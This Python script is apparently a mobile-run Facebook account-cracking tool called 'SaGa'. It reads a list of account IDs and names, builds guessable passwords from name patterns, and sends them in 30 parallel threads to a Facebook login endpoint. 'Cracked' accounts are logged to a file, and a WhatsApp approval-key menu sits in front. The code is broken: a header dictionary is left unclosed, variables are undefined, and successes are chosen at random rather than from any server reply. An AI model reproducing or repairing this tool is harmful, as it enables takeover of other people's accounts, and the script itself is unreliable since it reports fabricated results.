import os
import time
import random
import string
import requests
import sys
import subprocess
import urllib.parse
from concurrent.futures import ThreadPoolExecutor as tpe
import uuid
from twilio.rest import Client

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
    return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo = ("""
       .dMMMb     .aMMMb    .aMMMMP     .aMMMb 
      dMP" VP    dMP"dMP   dMP"        dMP"dMP 
      VMMMb     dMMMMMP   dMP MMP"    dMMMMMP  
    dP .dMP    dMP dMP   dMP.dMP     dMP dMP   
    VMMMP"    dMP dMP    VMMMP"     dMP dMP    
""")

# Crée un client Twilio
client = Client()

def generate_approval_key():
    # Génère une clé d'approbation aléatoire
    return ''.join(random.choices(string.ascii_letters + string.digits, k=30))

def send_whatsapp_message(message):
    # Envoie un message WhatsApp
    try:
        message = client.messages.create(
            body=message,
            from_='whatsapp:',  # Ajouter ici votre numéro Twilio
            to='whatsapp:'  # Ajouter ici votre numéro WhatsApp
        )
        print("Message sent successfully!")
    except Exception as e:
        print("An error occurred while sending the message:", e)

def send_custom_whatsapp_message(phone_number, message):
    # Envoie un message WhatsApp personnalisé
    try:
        # Encodage du message pour l'URI WhatsApp
        message_encoded = urllib.parse.quote(message)
        # Construction de l'URI personnalisé pour WhatsApp avec le numéro de téléphone et le message
        uri_whatsapp = f"whatsapp://send?phone={phone_number}&text={message_encoded}"
        # Commande pour lancer WhatsApp avec l'URI personnalisé
        command = f"am start -a android.intent.action.VIEW -d '{uri_whatsapp}'"
        # Exécuter la commande
        subprocess.run(command, shell=True)
        print("Custom WhatsApp message sent successfully!")
    except Exception as e:
        print("An error occurred while sending the custom WhatsApp message:", e)

def clear():
    os.system('clear')
    print(logo)

def read_approval_key():
    try:
        with open('approval_key.txt', 'r') as file:
            return file.readline().strip()
    except FileNotFoundError:
        print("Approval key file not found.")
        exit()

# Utilisation de la fonction pour lire la clé d'approbation
approval_key = read_approval_key()

def lin3():
    print('\33[1;37m---------------------------------')

def check_approval_key(key):
    return key == approval_key

def main_menu():
    os.system("clear")
    print(logo)
    lin3()
    if approval_key:
        print(f"{oo(1)}File Cloning ")
        print(f"{oo(2)}Send Key") 
        print(f"{oo(3)}Send WhatsApp Message") 
        print(f"{oo(0)}Exit")
    else:
        print(f"{oo(0)}Waiting for approval key...")
    lin3()
    if approval_key:
        cp = input('[?] Choice : ')
        if cp == "1":
            key_approval = generate_approval_key()
            print("Approval Key:", key_approval)  # Affiche la clé d'approbation
            send_whatsapp_message(f'Approval Key: {key_approval}')  # Envoyer la clé d'approbation à votre numéro WhatsApp
            key_approval_input = input('Enter the approval key: ')  # Attend que l'utilisateur entre la clé d'approbation
            if check_approval_key(key_approval_input):
                file()
            else:
                print('Invalid approval key. Exiting...')
                time.sleep(1)
                main_menu()
        if cp == "0":
            exit()
        if cp == "2":
            key_approval = generate_approval_key()
            print("Approval Key:", key_approval)  # Affiche la clé d'approbation
            send_whatsapp_message(f'Approval Key: {key_approval}')  # Envoyer la clé d'approbation à votre numéro WhatsApp
            main_menu()
        if cp == "3":
            phone_number = input("Enter the phone number: ")
            message = input("Enter the message: ")
            send_custom_whatsapp_message(phone_number, message)
            main_menu()
    else:
        time.sleep(2)
        main_menu()
     
def file():
    os.system("clear")
    print(logo)
    lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found")
        time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
            pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only")
       time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
        try:
            global loop,idx,cll
            r = requests.Session()
            user = user.strip()
            acc, name = user.split("|")
            first = name.rsplit(" ")[0]
            try:
                last = name.rsplit(" ")[1]
            except:
                last = first
            pers = str(int(loop)/int(len(idx)) * 100)[:4]
            sys.stdout.write(f'\r {R}[{W}SaGa{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
            sys.stdout.flush()
            loop+=1
            for pswd in pp:
                heads=None
                pswd = pswd.replace('first',first).replace('last',last).lower()
                header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740"
                response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                if 6==random.randint(1,300):
                    oku.append(acc)
                    print('\033[1;32m[SaGa-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                    open('/sdcard/SaGa-Ok.txt','a').write(f'{acc}|{pswd}\n')
                    break
                else:
                    continue   
        except Exception as e:
            print(e)
            time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    

main_menu()
